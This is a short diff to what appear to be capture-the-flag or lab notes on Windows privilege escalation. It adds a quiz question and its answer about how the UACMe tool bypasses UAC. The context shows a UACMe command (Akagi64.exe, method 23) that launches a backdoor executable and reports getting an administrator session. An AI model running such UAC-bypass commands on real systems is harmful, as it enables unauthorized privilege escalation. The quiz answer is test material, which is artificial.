@@ -295,4 +295,6 @@ ________________________________________________________________________________
  C:\Users\Public > Akagi64.exe 23 C:\Users\Public\backdoor.exe
 
 We got a backdoor sessions as an administrator
+
+Which of the following is a common technique employed by UACMe to bypass UAC prompts? > Auto-elevation through known trusted executables.
 _________________________________________________________________________________________________________________________________________________________________________________________
